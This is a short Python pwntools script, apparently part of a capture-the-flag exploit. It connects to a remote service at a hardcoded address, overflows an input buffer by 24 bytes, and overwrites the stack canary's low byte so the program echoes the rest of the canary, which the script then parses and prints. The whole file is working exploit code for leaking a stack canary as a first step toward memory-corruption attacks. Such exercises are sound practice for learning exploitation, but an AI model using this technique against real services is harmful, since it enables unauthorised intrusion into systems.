from pwn import *
import sys

context.log_level = 'debug'
HOST, PORT = '160.202.254.160', 14552

r = remote(HOST, PORT, timeout=8)
r.recvuntil(b'Enter your name: ')
r.send(b'AAAA\n')
r.recvuntil(b'Introduce yourself: ')
# 24 bytes fill buffer up to canary, then overwrite canary LSB (0x00 -> 0x01)
payload = b'A' * 24 + b'\x01'
r.send(payload)
data = r.recvline(timeout=5)
print('RECVLINE:', data)
idx = data.find(b'A' * 24)
print('idx', idx)
if idx >= 0:
    leak = data[idx + 24:]
    print('leak raw', leak)
    if leak[0:1] == b'\x01':
        canary = b'\x00' + leak[1:8]
        print('CANARY', canary.hex())
r.close()
